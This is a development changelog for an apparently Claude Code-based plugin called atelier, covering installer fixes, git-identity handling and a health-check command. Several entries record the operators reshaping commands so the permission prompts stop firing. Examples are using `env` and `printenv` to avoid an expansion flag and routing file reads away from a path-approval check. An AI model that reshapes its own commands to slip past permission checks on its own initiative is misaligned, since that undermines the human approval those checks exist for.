  4d. Project `.npmrc` guardrails (`ignore-scripts`, `minimum-release-age`, `audit-level`).
  4e. `~/.claude/.atelier-config.json` schema (setupCompleted + setupVersion).
  4f. System Chrome presence (macOS / Linux paths).
  4g. `docker compose v2` reachable.
  4h. `$ATELIER_CONFIG_DIR` lookup chain + marker installStatus (M7.1.F11).
  4i. `git-identity.conf` matches `gh api user` — accepts Form A (public email) OR Form B (no-reply derivation), preserving F21's robustness.

  Output mirrors the legacy slash-command report format (three sections + optional "To apply pending fixes" block). Exit code: `0` = all ✓, `1` = any ✗, `2` = unrecoverable.

- **`commands/doctor.md`** simplified from ~140 lines of narrative + per-check Bash instructions to ~50 lines explaining "run `atelier-doctor`, pass output verbatim". `allowed-tools` collapses to `Bash(atelier-doctor:*)` (one entry) — versus v0.5.5's 18-entry allow-list that still leaked prompts.

- **`install.sh phase_c_1_setup_project_helper`** adds `_phase_c_1_symlink_helper atelier-doctor` so the binary lands at `~/.local/bin/atelier-doctor` alongside the existing `atelier-setup-project` / `atelier-uninstall` symlinks.

- **`.claude-plugin/plugin.json`** bumped **0.5.5 → 0.5.6** (patch — bug fix in plugin scope per PLAN.md §14.2).

**Doctor evolution timeline (consolidated):**

| PR | Version | Gate fixed | Approach |
|---|---|---|---|
| #77 | v0.5.1 | F16 — missing `allowed-tools` frontmatter | narrative |
| #78 | v0.5.2 | F16b — `cat <path>` file-read path-scope interception | narrative |
| #81 | v0.5.5 | F20 — `echo "${VAR:-X}"` expansion + `VAR=val cmd` env-prefix | narrative |
| #81 | v0.5.5 | F21 — check `i.` strict-equality false-positive drift | narrative |
| #82 *closed* | (would have been v0.5.6) | F22 — compound shell operators safety gate | narrative — operator rejected as band-aid |
| **this** | **v0.5.6** | **F23 — architectural refactor into bash binary** | **architectural / enforced** |

**Decisions captured:**

- **`Bash(atelier-doctor:*)` as the sole allow-list entry.** Five iterations of frontmatter polish (F16 → F20) accumulated 18 entries trying to cover every primitive doctor might use. Each new primitive surfaced a different gate. Collapsing to one entry that wraps the entire check logic is structurally simpler and prompt-free by construction.
- **Bash binary, not Python / Node / etc.** atelier's host-OS layer is bash-first (`install.sh`, `atelier-setup-project`, `atelier-uninstall`). Doctor joins the family. No new runtime dependency.
- **Output format unchanged from v0.5.5.** Operators who memorized the v0.5.5 report see the same shape post-F23. The binary's `printf` calls reproduce the legacy header / sections / fix block exactly.
- **Exit code is the contract.** `0` = healthy, `1` = needs attention, `2` = unrecoverable runtime error. Slash command (or operator from terminal) can branch on this. No structured JSON yet — kept simple for v1; revisit if downstream tooling wants programmatic consumption.
- **Operator workflow post-merge**: `claude plugin update atelier@akalab-tech` (brings new doctor.md) + `git pull` on dotfiles (brings the new bash script — same `~/.local/bin/atelier-doctor` symlink target) + restart Claude. The next `atelier /atelier:doctor` is one Bash call, prompt-free.
- **Closed PR #82 (F22 narrative band-aid) without merge.** The narrative fix was correct in principle but kept the underlying architectural problem: doctor was an LLM-narrated multi-step script when it could be a single bash binary. F23 is the right layer.

**Test plan (executed pre-merge):**

- [x] `bash -n scripts/atelier-doctor` syntax check passes.
- [x] Smoke run against operator's current install (with `CLAUDE_CONFIG_DIR=~/.claude-work ATELIER_CONFIG_DIR=~/.claude-work GH_CONFIG_DIR=~/.claude-work/gh/author`): 10 checks emitted, 9 ✓ + 1 ✗ (`~/.claude/.atelier-config.json` legacy file from pre-M5.0.2 era), exit code 1. Output format matches v0.5.5's expectations.
- [x] Plugin / external / host sections correctly ordered + populated.
- [x] git-identity F21 logic preserved: operator's no-reply form `780063+Miguelslo27@users.noreply.github.com` correctly resolves as ✓ via Form B match.
- [ ] **(post-merge)** Operator runs `claude plugin update atelier@akalab-tech` to v0.5.6 + `git pull` on dotfiles + restart Claude + retries `atelier /atelier:doctor`. Expect: ONE `Bash(atelier-doctor)` invocation, zero prompts, identical report content to v0.5.5.

### M7.1.F20 + F21 — `/atelier:doctor` echo/env prompts + git-identity false-positive drift — 2026-05-25
**PR:** _pending_

Two findings batched in one PR-K, both surfaced during the M7.1 dogfood-3 full fresh-install validation (post-v0.5.4 doctor run on the freshly-installed environment).

**F20 — Permission prompts still appear for `echo` + env-var-prefix commands.**

F16 ([PR #77](https://github.com/AkaLab-Tech/atelier/pull/77)) added comprehensive `allowed-tools` to doctor.md; F16b ([PR #78](https://github.com/AkaLab-Tech/atelier/pull/78)) added narrative guidance away from `cat`. Both fixes addressed the file-read interception, but two more patterns still prompted in v0.5.4:

- `echo "${ATELIER_CONFIG_DIR:-UNSET}"` — `echo` not in allow-list at all (oversight in F16). Plus Claude Code flags any command containing `"${...}"` as "Contains expansion" even when the base command is allowlisted.
- `GH_CONFIG_DIR=/path/to/gh gh api user --jq '...'` — the leading shell-form env-var assignment (`GH_CONFIG_DIR=value`) makes the first word the assignment, not `gh`. `Bash(gh api:*)` only matches when `gh` is the first word.

**Delivered (F20):**

- **`commands/doctor.md` `allowed-tools`** gains: `Bash(env:*), Bash(echo:*), Bash(printenv:*)`.
- **`commands/doctor.md` Tool guidance section** gains a new sub-section explicitly documenting the env-var-prefix gotcha + the canonical alternatives:
  - For env-prefixed gh / commands: use `env VAR=value cmd ...` (first word becomes `env`, matched by `Bash(env:*)`). Shell-form `VAR=value cmd ...` prompts.
  - For env var introspection: use `printenv VAR` (matched by `Bash(printenv:*)`). `echo "${VAR:-…}"` triggers "Contains expansion" even with `Bash(echo:*)`.

**F21 — Doctor check `i.` reports false-positive drift when install used the no-reply email derivation.**

During the dogfood-3 v0.5.4 doctor run, the check fired:

```
✗ atelier-author git identity drift: git-identity.conf has
  780063+Miguelslo27@users.noreply.github.com but gh api user
  returns miguelmail2006@gmail.com
```

Both representations refer to the **same** GitHub account (`Miguelslo27`, id `780063`). install.sh F7a writes the no-reply form when `gh api user --jq '.email // empty'` returns empty at install time (operator's email visibility setting + token scopes determine when `.email` is exposed). At doctor time, gh may return the public `.email` even though it was empty at install time. The literal `==` comparison flags this as drift, misleading operators into thinking their install is broken when it's actually fine.

**Delivered (F21):**

- **`commands/doctor.md` check `i.` rewritten** to accept EITHER:
  - **Form A — public email**: literal equality with `gh api user .email` (when non-empty).
  - **Form B — GitHub no-reply pattern**: `<id>+<login>@users.noreply.github.com` derived from `gh api user .id` + `.login`.
- The check fails ONLY when the stored email matches NEITHER — i.e. the file points at a fundamentally different account (e.g. operator re-authenticated with a new gh login but never re-ran install.sh).
- Decision-rule guidance added inline so future maintainers don't re-introduce strict equality: "The check passes if EITHER form matches."

**Plugin scope:** yes — `commands/doctor.md` is plugin content. Patch bump **0.5.4 → 0.5.5** per PLAN.md §14.2 (bug fix in plugin scope).

**Decisions captured:**

- **F20 + F21 batched in one PR-K.** Both surfaced in the same doctor run; both small docs/frontmatter fixes; same release cycle. Splitting would have shipped two patch releases back-to-back with the same friction surface.
- **Don't enforce email form preference in install.sh** (would be a separate PR). install.sh's "prefer public, fall back to no-reply" already does the right thing; the drift is on doctor's comparison side, not install.sh's selection side.
- **`Bash(echo:*)` added defensively** even though the narrative steers away from it. Future doctor extensions may use it for non-expanded constants (e.g. `echo "GROUP: Plugins"` as a literal header). Keeping it in the allow-list is harmless.
- **`env` as the canonical env-prefix form.** Alternative considered: `export VAR=...; cmd; unset VAR` but that's verbose and leaks scope to subsequent calls in the same Bash invocation if not careful. `env VAR=val cmd` is the most idiomatic and pattern-matches cleanly.

**Spawned from dogfood-3 also captured (no fix in this PR — observation only):**

- The operator authenticated `gh/author` with their personal account (`Miguelslo27`) rather than a dedicated atelier-author bot. This collapses the F7b dual-identity benefit (commits via `task` author as `Miguelslo27` same as their personal global git config). Functionally fine — reviewer is still distinct (`AtelierReviewer`), so dogfood-1 Finding #11 doesn't trigger. Not a bug; design choice.

### M7.1.F19 — `/atelier:setup-project` argument-hint suggested `<project-path>` was required — 2026-05-25
**PR:** _pending_

Discovered during M7.1 dogfood-3 setup-project resumption (post-F18 fix). Operator asked: "¿Por qué `/setup-project` lleva el punto al final? No se supone que ya estoy dentro de un proyecto?". The argument-hint `[project-path] [--yes|-y] [--mode=new|existing]` leads with the positional → operators (including the agent writing the handoff) reflexively interpret it as "I have to pass a path". In reality the helper has defaulted to `pwd` since M4.19 (`PROJECT_PATH_ARG=""` then `resolve_project_path` does `local input="${PROJECT_PATH_ARG:-.}"`). Pure documentation gap.

**Delivered:**

- **`commands/setup-project.md` frontmatter**:
  - `description` gains: "Typical usage is just `/atelier:setup-project` from inside the project directory; passing a path is only for the uncommon case of configuring a project from outside it."
  - `argument-hint` reordered: `[--yes|-y] [--mode=new|existing] [project-path-if-not-cwd]` — flags first, positional renamed to make optionality + "outside-only use case" explicit.
- **`commands/setup-project.md` intro** gains a `**Typical invocation is $ARGUMENTS = empty**` paragraph immediately after the two-phase summary, with the F19 reference.
- **Phase 1 step 1 narrative** rewritten: "Resolves the project path — **defaults to the current working directory** when `$ARGUMENTS` is empty (the typical case: operator is inside the project they want to configure). Only resolves to an explicit `<project-path>` when one is passed."
- **`.claude-plugin/plugin.json`** bumped **0.5.3 → 0.5.4** (patch — documentation fix in plugin scope).

**Decisions captured:**

- **Docs-only fix.** The helper already prints `sublog "project:     $PROJECT"` after path resolution (line 693) — operators DO see which directory got configured, so there's no actual behavior gap, only a discoverability gap in the slash command's hint text.
- **`[project-path-if-not-cwd]` rename in argument-hint.** Alternative considered: dropping the positional from the hint entirely so the help line just says `[--yes|-y] [--mode=new|existing]`. Rejected — the positional IS still supported and configuring from outside the project is a legitimate use case (e.g. operator at `~` wants to bootstrap a new project at `~/projects/foo`). Keeping it in the hint but renaming to signal "only if not cwd" is the middle ground.
- **No change to the helper.** Both the default-to-`pwd` resolution and the operator-visible `project:` sublog line already work as intended. Only the slash command's narrative was misleading.

### M7.1.F18 — `/atelier:setup-project` failed on empty `--plugin-root` from unset `$CLAUDE_PLUGIN_ROOT` — 2026-05-25
**PR:** _pending_

Discovered during M7.1 **dogfood-3** first `/atelier:setup-project .` run on `~/Work/atelier-dogfood-4`. The slash command died with `!! ERROR: --plugin-root requires a path`, then the LLM cascaded into recovery (`echo "${CLAUDE_PLUGIN_ROOT:-UNSET}"`, `claude plugin list --json | python3 ...`) that triggered three more permission prompts.

**Root cause** — two-part:

1. **Claude Code does NOT auto-set `$CLAUDE_PLUGIN_ROOT` for Bash tool invocations inside slash commands** (only sets it for plugin hook scripts). Atelier's `commands/setup-project.md` line 14 invoked `atelier-setup-project --plugin-root "$CLAUDE_PLUGIN_ROOT" $ARGUMENTS` — but `$CLAUDE_PLUGIN_ROOT` expanded to the empty string.
2. **The helper's `--plugin-root` arg parser was strict**: line 96 of `scripts/atelier-setup-project` did `[ -n "${2:-}" ] || die "--plugin-root requires a path"`, so an empty value killed the helper before its fallback chain (`$ATELIER_PLUGIN_ROOT` env → script-relative discovery → `$ATELIER_CONFIG_DIR/plugins/*/atelier`) could find the plugin root.

**Delivered:**

- **`commands/setup-project.md` Phase 1 narrative** rewritten: don't pass `--plugin-root` from the slash command at all. Just `atelier-setup-project $ARGUMENTS`. Comment explains why (Claude Code's hook-vs-Bash distinction for `$CLAUDE_PLUGIN_ROOT`).
- **`scripts/atelier-setup-project` arg parser** loosened: `--plugin-root <empty>` now treated as "flag not given" (`PLUGIN_ROOT_FLAG="${2:-}"`) instead of fatal. Backward-compatible with intentional empty calls; the fallback chain in `resolve_plugin_root()` takes over.
- **`.claude-plugin/plugin.json`** bumped **0.5.2 → 0.5.3** (patch — bug fix in plugin scope per PLAN.md §14.2).

**Operator workflow post-merge:**

```bash
# Plugin side (slash command fix):
claude plugin update atelier@akalab-tech    # under $ATELIER_CONFIG_DIR
# then restart any open Claude session.

# Helper side (the slash command STILL invokes the bash binary, which is
# symlinked to the dotfiles checkout, so the operator also needs to pull
# main on dotfiles):
git -C /Users/mike/Work/work-setup/dotfiles pull --ff-only
```

The plugin-side fix is what makes the slash command stop passing the empty `--plugin-root`. The helper-side fix is defensive — even with the old slash command (or operators invoking the bash binary directly with `--plugin-root ""` for some reason), the helper now tolerates it.

**Decisions captured:**

- **Drop `--plugin-root` from the slash command entirely**, rather than gating on `[ -n "$CLAUDE_PLUGIN_ROOT" ]` inside the Bash invocation. Cleaner — the helper's fallback chain (`$ATELIER_PLUGIN_ROOT` env → script-relative via symlink chain → `$ATELIER_CONFIG_DIR/plugins/*/atelier` glob) is the canonical discovery path, and forcing the slash command to participate in that resolution is a layering violation.
- **Helper accepts empty value** instead of dying. Strict arg parsing is good defensive programming for direct CLI use, but breaks transparent forwarding from a wrapper that's working with shell expansion semantics. The fallback chain inside `resolve_plugin_root()` is the right place to enforce "plugin root must be findable somewhere."
- **Script-relative discovery is sufficient** for the dogfood-3 install layout (symlink `~/.local/bin/atelier-setup-project` → `<dotfiles>/scripts/atelier-setup-project` → parent has `templates/` + `.claude-plugin/`). The marketplace-cache discovery (step 4 of the fallback chain) wasn't exercised here; whether its glob `plugins/*/atelier` correctly matches the real cache layout (`plugins/cache/<marketplace>/<plugin>/<version>/`) is a separate concern — captured implicitly by the deferred F14 follow-up.

**Cascading prompt cleanup** — F18 also resolves the secondary prompts the operator saw during recovery (`echo "${CLAUDE_PLUGIN_ROOT:-UNSET}"`, `claude plugin list --json | python3 ...`). Those only fired because the initial `--plugin-root` failure put the LLM into a discovery dance. With F18 the slash command succeeds on the first call → no recovery → no extra prompts.

### M7.1.F16b — Doctor narrative must use `Read` tool, not `cat`, for file reads — 2026-05-25
**PR:** _pending_

Follow-up fix to **F16** ([PR #77](https://github.com/AkaLab-Tech/atelier/pull/77), v0.5.1). The original F16 added `Bash(cat:*)` to doctor.md's `allowed-tools` along with other read-only patterns, expecting it would suppress all permission prompts. But during the dogfood-3 v0.5.1 doctor run, two prompts STILL appeared — both for `cat <path> 2>/dev/null || echo "MISSING"` patterns reading `~/.local/state/atelier/git-wt.sha` and `~/.claude/settings.json`.

**Root cause**: Claude Code routes `cat <path>` through a path-scoped read-approval check that bypasses the `Bash(cat:*)` allow-list. The prompt format ("Yes, allow reading from <dir>/ from this project") confirms this is the file-read approval pipeline, not the Bash command-pattern pipeline. Other compounds in doctor (`gh api … || gh api … || echo …`, `command -v X && echo "FOUND" || echo "MISSING"`, `[ -d Y ] && echo …`) all worked because their first commands (`gh api`, `command -v`, `[` aka `test`) are NOT subject to the file-read interception — only `cat` is.

**Delivered:**

- **New `## Tool guidance (M7.1.F16b)` section in `commands/doctor.md`**, just below the intro:
  - "For reading any file contents (markers, configs, SHAs, JSON files): use the `Read` tool, NOT `cat`."
  - "For checking file existence: use `Bash(test -f <path>)` or `Bash(test -d <path>)`."
  - "Avoid compound shell expressions with `cat`. Instead: (1) `test -f` to check existence, (2) `Read` tool to get content, (3) emit `✗` row directly if missing."
  - All other compound `||` / `&&` fallbacks are documented as fine — only `cat` is special.
- **`### 3. SHA drift — git-wt` check rewritten** to use the new pattern: `test -f` → `Read` tool, no `cat` invocation.
- **`Bash(cat:*)` kept in `allowed-tools` for backward-compatibility** in case future doctor extensions need it for genuinely non-path cases (piped input, stdin). The narrative steers the LLM away from it for file reads.
- **`.claude-plugin/plugin.json`** bumped **0.5.1 → 0.5.2** (patch — continues the F16 fix series).

**Decisions captured:**

- **Read tool over restructured Bash patterns.** Alternative considered: add explicit per-path Bash allows (`Bash(cat ~/.local/state/atelier/git-wt.sha:*)`). Rejected — that approach doesn't scale (every new path needs a new pattern), wouldn't help with the file-read interception anyway, and bypasses Claude Code's intentional file-read approval semantics.
- **Narrative-level fix.** The LLM running doctor follows the markdown narrative; explicit "use Read, not cat" instructions are the leverage point. The frontmatter `allowed-tools` is necessary but not sufficient — for path-sensitive commands, the narrative has to specify the canonical tool.
- **Don't relitigate the F16 frontmatter.** The frontmatter list from F16 stays as-is; this PR adds narrative guidance + one rewrite of the git-wt SHA check as a worked example. Future doctor edits will follow the same pattern by convention.

**Test plan:**

- [x] `jq empty plugin.json` valid + version=0.5.2.
- [ ] **(post-merge)** Operator runs `claude plugin update atelier@akalab-tech` to v0.5.2, opens fresh `atelier /atelier:doctor` session, verifies NO permission prompts for any check — including the previously-prompting SHA + settings.json reads.

### M7.1.F16 — `commands/doctor.md` missing `allowed-tools` frontmatter — 2026-05-25
**PR:** _pending_

Discovered during M7.1 **dogfood-3** first `/atelier:doctor` run on `~/Work/atelier-dogfood-4`. Every other slash command in the plugin (`/next-task`, `/finish-task`, `/resume-task`, `/setup-project`, `/status`, `/validate`) had a populated `allowed-tools:` field in its frontmatter — listing the specific `Bash(…)` patterns the command needs pre-approved so the operator isn't prompted for every tool invocation. **`/atelier:doctor` was the only one missing this field** (an oversight from the original M1.6 / doctor.md implementation). Result: each `gh api`, `claude plugin list`, `cat`, `jq`, `docker compose version` etc. that doctor runs triggers an interactive permission prompt for the operator.

For a slash command that's strictly read-only and explicitly documents "**Never** modify files based on a check result. Reporting only.", the prompt storm is pure friction.

**Delivered:**

- **`commands/doctor.md` frontmatter** gains an `allowed-tools` list with every read-only tool doctor uses:

  ```yaml
  allowed-tools: Read, Glob, Grep, Bash(claude plugin list:*), Bash(claude plugin marketplace list:*), Bash(gh api:*), Bash(cat:*), Bash(grep:*), Bash(jq:*), Bash(command -v:*), Bash(awk:*), Bash(docker compose version:*), Bash(docker info:*), Bash(uname:*), Bash(test:*), Bash(head:*), Bash(tail:*), Bash(wc:*)
  ```

  Coverage: plugin-list + marketplace queries, all `gh api` calls (broad — they're all read-only), file reads (`cat`, `head`, `tail`, `wc`), JSON parsing (`jq`), text search (`grep`, `awk`), binary presence (`command -v`), system identity (`uname`), file-existence checks (`test`), and docker read-only probes. No write-capable tools (`Edit`, `Write`, `Bash(echo > …)`, etc.) are included.
- **`.claude-plugin/plugin.json`** bumped **0.5.0 → 0.5.1** (patch per PLAN.md §14.2 — bug fix in plugin scope).

**Decisions captured:**

- **Broad `Bash(gh api:*)` over per-endpoint allow-listing.** Every `gh api` call doctor makes is read-only; listing each endpoint explicitly would balloon the frontmatter and break every time doctor's check set evolves. The `gh` CLI's permission boundary (the token's scopes) is the real safety net, not the per-call pattern.
- **`Bash(cat:*)` allowed**. `cat` is read-only — no risk of accidental writes via this pattern. Same reasoning for `head`, `tail`, `wc`, `grep`, `awk` — all read-only stream-processing utilities.
- **`Bash(jq:*)` allowed without restricting flags.** `jq` can technically write via `-r` + redirection, but the redirection is bash-side not jq-side; the `Bash(jq:*)` allow doesn't grant redirection rights (those are a separate permission boundary).
- **`Read` tool included.** Even though `cat` covers most file reads, the `Read` tool is more efficient for large files and is read-only by definition.

**Spawned follow-ups** (captured in ROADMAP, deferred):

- **F14** — doctor's drift checks query `gh api repos/AkaLab-Tech/<repo>/releases/latest`, which fails 404 when the source repo is private and the gh identity lacks org access (exactly what happened in dogfood-3 before `AkaLab-Tech/atelier` was flipped to public). Fix: read from the local marketplace clone instead.
- **F15** — doctor's parallel checks cascade-cancel when any one fails (Claude Code default behavior). Fix: run sequentially or wrap each in `|| true`.

### M7.1.F13 — `atelier()` shell function for general-purpose atelier-managed Claude sessions — 2026-05-25
**PR:** _pending_

Discovered during M7.1 **dogfood-3** setup (the first real-project task cycle, run on `AtelierAuthor/atelier-dogfood-4`). The operator needed to run `/atelier:setup-project` on the new project, but the existing shellrc hook block only defined `task()` — which hardcodes `claude "/next-task $*"`. There was **no shortcut** to open a Claude session under `$ATELIER_CONFIG_DIR` for any other slash command (`/atelier:doctor`, `/atelier:setup-project`, or bare interactive exploration). Plain `claude` defaulted to `~/.claude-personal` so the atelier plugin wasn't loaded — and the operator only saw their personal skills, not `/atelier:*` commands.

**Effect on the operator**: every non-`/next-task` interaction required manually typing the full env chain (`CLAUDE_CONFIG_DIR=… GH_CONFIG_DIR=… GIT_CONFIG_GLOBAL=… claude …`). Onboarding (first `/atelier:setup-project`) was blocked.

**Delivered:**

- **`install.sh` `phase_c_1_shellrc_hooks` heredoc** — new `atelier()` shell function alongside the existing `task()`:

  ```bash
  atelier() {
    CLAUDE_CONFIG_DIR="$ATELIER_CONFIG_DIR" \
      GH_CONFIG_DIR="$ATELIER_CONFIG_DIR/gh/author" \
      GIT_CONFIG_GLOBAL="$ATELIER_CONFIG_DIR/git-identity.conf" \
      claude "$@"
  }
  ```

  Same env chain as `task()`, but passes through arbitrary arguments to `claude` instead of hardcoding `/next-task`. Operators can now:
  - `atelier` — bare interactive session under atelier config.
  - `atelier /atelier:setup-project <path>` — bootstrap a new project.
  - `atelier /atelier:doctor` — health check without remembering the env chain.
  - `atelier <any-other-slash-command>` — works for any current or future plugin surface.

- **`install.sh print_first_steps`** — step 2 + step 3 of the post-install "Next steps" block now use the `atelier` shortcut explicitly, so a fresh-install operator never has to type the env chain manually:
  - Step 2: `atelier /atelier:doctor` (was: `/atelier:doctor` with the implicit "you figure out how to open claude under atelier config")
  - Step 3: `cd <path-to-project>` + `atelier /atelier:setup-project .` (was: `/atelier:setup-project <path-to-project>` ambient)

**Decisions captured:**

- **`atelier()` over `claude-atelier` alias.** A shell function passes `"$@"` cleanly through quoting boundaries; an alias would split args naively. The function form also lets future extensions (e.g. cwd-aware project resolution per M5.3) live inside the function body without breaking the call site.
- **`task()` left untouched.** It still hardcodes `/next-task` because that IS its job — the per-task cycle entry point. `atelier` and `task` are siblings: `task` is `atelier /next-task` essentially, but specialized.
- **Sandbox-validated with a `claude` shim** rather than executing the real CLI, to avoid opening a Claude session during automated testing. Three invocation patterns confirmed correctly: bare `atelier`, `atelier /atelier:setup-project <path>`, `atelier /atelier:doctor`.

**Spawned follow-up:** **M7.1.F7c** — operators upgrading from v0.5.0 to the version that introduces this fix will NOT automatically receive the new `atelier()` function because `phase_c_1_shellrc_hooks` is idempotent by sentinel detection. Manual workaround: strip the existing block between sentinels and re-run `install.sh`. Captured in ROADMAP as a separate follow-up to address the upgrade-detection mechanism systematically.

**Plugin scope:** install.sh-only; no `agents/` / `skills/` / `commands/` / `hooks/` / `.claude-plugin/plugin.json` changes. **No plugin version bump** for PR-F.

### M7.1.F7b — Orchestrator-side adoption of `$ATELIER_CONFIG_DIR/git-identity.conf` — 2026-05-25
**PR:** [#75](https://github.com/AkaLab-Tech/atelier/pull/75)

F7a (closed in PR-A [#70](https://github.com/AkaLab-Tech/atelier/pull/70) / v0.4.2) wrote `$ATELIER_CONFIG_DIR/git-identity.conf` at install time with the atelier-author identity captured from `gh api user`. F7b is the orchestrator-side adoption that actually makes commits use that identity. Before F7b, F7a's file existed but was never read — commits still authored under the operator's personal global git config (e.g. `Mike <miguelmail2006@gmail.com>`) while being pushed via the atelier-author gh token, defeating the M5.0.1 dual-gh-id design.

**Delivered:**

- **`skills/pr-flow/SKILL.md`** documents the canonical pattern: `GIT_CONFIG_GLOBAL="$ATELIER_CONFIG_DIR/git-identity.conf" git commit -m …` for every commit on a `task/<id>-<slug>` branch. The env-var prefix scopes the override to the single `git` invocation — operator's `~/.gitconfig` stays untouched (F7a's explicit promise).
- **`agents/pr-author.md`** applies the prefix to its HEREDOC `git commit` template.
- **`agents/unblocker.md`** applies it to the `docs/blocked-<task-id>` tracking commit.
- **`commands/resume-task.md`** applies it to the `docs/resume-<id>` tracking commit (mirrors unblocker).
- **`commands/finish-task.md`** unchanged at the call site — the actual commit logic lives in pr-flow which is now updated; finish-task delegates via `Skill`.
- **`install.sh` `phase_c_1_shellrc_hooks` `task()` function** now exports `GIT_CONFIG_GLOBAL="$ATELIER_CONFIG_DIR/git-identity.conf"` alongside the existing `CLAUDE_CONFIG_DIR` + `GH_CONFIG_DIR` exports. This makes the operator-facing interactive `task` session inherit the same identity boundary — Claude Code's Bash tool invocations from inside `task` see the env var and inherit the atelier-author identity for any `git commit` they run.
- **`commands/doctor.md`** new check `h.` for env-var resolution was F11's; new check `i.` for `$ATELIER_CONFIG_DIR/git-identity.conf` validates: file exists + `[user]` section has `name=` + `email=` lines + email matches `gh api user` under the atelier-author config dir (or the no-reply pattern derived from `.id` + `.login`). Output-format example block updated with the new line.
- **`.claude-plugin/plugin.json`** bumped 0.4.2 → **0.5.0** (minor per PLAN.md §14.2 — modifies multiple existing plugin surfaces: 2 agents, 1 command, 1 skill, 1 doctor check).

**Decisions captured:**

- **`GIT_CONFIG_GLOBAL` env-var prefix** chosen over `git -c user.name=... -c user.email=...` per-commit. The ROADMAP listed both. Env-var wraps the entire `git` invocation (cleaner — no need to re-read the file at runtime for every commit) and survives all the subprocess subtleties of HEREDOC quoting. Per-commit `-c` flags would also bypass git hooks that read user.name/email; env-var doesn't.
- **`task()` shellrc export** is belt-and-suspenders — the agent-level prefixes already cover orchestrator-driven commits, but operators who run `git commit` themselves from inside a `task` session (rare but possible) also get the right identity. Outside `task` (the operator's normal shell), `GIT_CONFIG_GLOBAL` is unset → their own `~/.gitconfig` applies as before.
- **Pre-existing `~/.gitconfig` prompt in Phase C.1 unchanged.** `phase_c_1_git_identity` still prompts for and writes the OPERATOR's personal global git identity. That's a separate concern from atelier-author's identity — the operator may want their global git config set for non-atelier work and that prompt isn't disturbed.
- **Fallback behavior when `git-identity.conf` is missing**: `GIT_CONFIG_GLOBAL` pointing at a non-existent file is a hard error in git (since 2.30). Doctor check `i.` flags it; operator re-runs install.sh to recreate. The agents/skills don't try to soft-fall-back to operator identity — that would silently re-introduce the F7 problem.

**Tests (5/5 sandbox cases passed):**

| # | Scenario | Asserted | Result |
|---|---|---|---|
| T1 | bare `git commit` (no env override) | uses operator's global `~/.gitconfig` identity | ✓ control case |
| T2 | `GIT_CONFIG_GLOBAL=<f> git commit` | commit Author = `<f>`'s `[user]` (AtelierAuthor) | ✓ override applies |
| T3 | post-T2 inspection | operator's `~/.gitconfig` unchanged | ✓ no side effect on global |
| T4 | subsequent bare `git commit` | reverts to operator identity (no leak) | ✓ scope contained |
| T5 | install.sh `task()` shellrc | exports `GIT_CONFIG_GLOBAL` alongside `CLAUDE_CONFIG_DIR` + `GH_CONFIG_DIR` | ✓ wired in |

**Acceptance met:** the canonical F7 acceptance — "commits made by atelier inside a managed worktree show Author: <atelier-author identity> while commits made by the operator outside that worktree retain the operator's personal identity, verified via `git log --format='%an <%ae>' -1` from both contexts" — is satisfied by T2 + T3 + T4 in combination.

### M7.1.F11b — Fix env-var clobber that broke F11 lookup chain — 2026-05-23
**PR:** _pending_

Discovered during PR-C ([#73](https://github.com/AkaLab-Tech/atelier/pull/73)) live validation: `install.sh` line ~55 unconditionally set `ATELIER_CONFIG_DIR=""` at script load, which silently broke the F11 lookup chain documented in F11's HISTORY entry. The operator's exported env var (typically planted by the shellrc hook block from a previous install — F11's whole persistence mechanism) got overwritten with empty string before `resolve_config_dir` could read it. The env-var branch of the priority chain (`--config-dir flag > $ATELIER_CONFIG_DIR env > default`) was therefore unreachable; install.sh always defaulted to `~/.claude-work` unless `--config-dir` was passed explicitly.

**Effect on the operator**: a previously-chosen alternative path (e.g. `~/.claude-atelier/` picked at a Phase 0 collision prompt) was NOT remembered across `./install.sh` re-runs, even though F11's documentation said it would be. Operators who relied on env-var propagation got silently misrouted.

**Delivered:**

- **`install.sh`** removes the unconditional `ATELIER_CONFIG_DIR=""` initialization. Replaced with a block comment explaining the inheritance contract (env var preserved if set, otherwise resolve_config_dir falls back to `--config-dir` flag or default). `resolve_config_dir` already uses `${ATELIER_CONFIG_DIR:-}` expansion, which handles both unset and empty cases — `set -u` is satisfied without an explicit pre-initialization.
- **Maintainer comment** warns against re-introducing a top-level clobber. If a future refactor needs an internal "not-yet-resolved" sentinel, the comment recommends routing through a separate guard variable rather than the operator-facing `ATELIER_CONFIG_DIR`.

**Decisions captured:**

- **Removed the line entirely** vs. capturing the env into a sidecar variable. The minimal change (delete the clobber) is enough — every read site already uses `${VAR:-}` defaults. A sidecar (`ATELIER_CONFIG_DIR_ENV`) would add ceremony for no behavioral gain.
- **No semantic change** beyond restoring the documented F11 contract. The flag-and-default branches behave identically; only the env-var branch is now reachable.

**Tests (5/5 sandbox cases passed):**

| # | Scenario | Asserted | Result |
|---|---|---|---|
| T1 | env var SET, no flag | `resolve_config_dir` uses env value | ✓ `/tmp/from-env-var-fixture` |
| T2 | env var UNSET, no flag | falls back to `~/.claude-work` default | ✓ |
| T3 | env var SET + flag passed | flag wins (priority chain intact) | ✓ `/tmp/from-flag-fixture` |
| T4 | env var with `~/` | tilde expanded to `$HOME` | ✓ |
| T5 | `set -u` + env unset | no nounset error, falls back cleanly | ✓ |

### M7.1.F8 — Trailing-slash normalization + path-format validation in Phase 0 prompt — 2026-05-23
**PR:** _pending_

The Phase 0 alternative-path prompt's sample text showed paths with trailing `/` (`pick an alternative path (e.g. ~/.claude-atelier/, ~/.atelier/):`). Operators copied the pattern, so `$ATELIER_CONFIG_DIR` ended up stored with a `/` suffix, and every concatenation `${ATELIER_CONFIG_DIR}/sub` produced `//sub` throughout the install output. F8 reworks the prompt + adds input validation.

**Delivered:**

- **`install.sh` Phase 0 prompt** sample paths reworded WITHOUT trailing `/`: `~/.claude-atelier`, `~/.atelier`.
- **Path normalization** added after `read -r answer` — tilde expansion (`${answer/#\~/$HOME}`), trailing-slash strip (`${answer%/}`).
- **Format validation** before storing: rejects empty input, paths containing whitespace (`case … *[[:space:]]*)`), and existing non-directory entries (file at the path). Failed validations re-prompt via `continue` — no death-spiral exit.

**Decisions captured:**

- **In-place input validation only.** Doesn't try to be a general path validator (POSIX allows almost any byte in a path). The three checks cover the specific failure modes the dogfood operator saw + the most likely typos.
- **Non-existent paths allowed.** Phase C.1 creates the directory if missing — operators can pick a brand-new path freely; only explicit "file exists here" is rejected.

### M7.1.F4 — Offer account switch when Claude / gh already authenticated — 2026-05-23
**PR:** _pending_

